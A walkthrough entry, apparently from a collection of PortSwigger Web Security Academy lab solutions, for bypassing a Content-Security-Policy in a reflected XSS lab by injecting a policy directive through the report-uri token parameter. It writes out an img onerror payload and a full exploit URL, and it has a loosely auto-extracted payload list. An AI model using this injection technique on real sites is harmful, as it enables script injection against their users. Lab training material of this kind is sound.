## Reflected XSS protected by CSP, with CSP bypass

**Category:** xss_reflected
**Difficulty:** Unknown

### Description
This lab uses CSP and contains a reflected XSS vulnerability.

### Solution Steps
1. Enter the following into the search box: <img src=1 onerror=alert(1)>
2. Observe that the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token . Because you can control the token parameter, you can inject your own CSP directives into the policy.
4. Visit the following URL, replacing YOUR-LAB-ID with your lab ID: https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

### Key Payloads
- `alert`
- `<img src=1 onerror=alert(1)>`
- `Content-Security-Policy`
- `report-uri`
- `token`
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`
- `script-src-elem`
- `script`
- `script-src`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: xss_reflected

---
*Source: PortSwigger Web Security Academy*
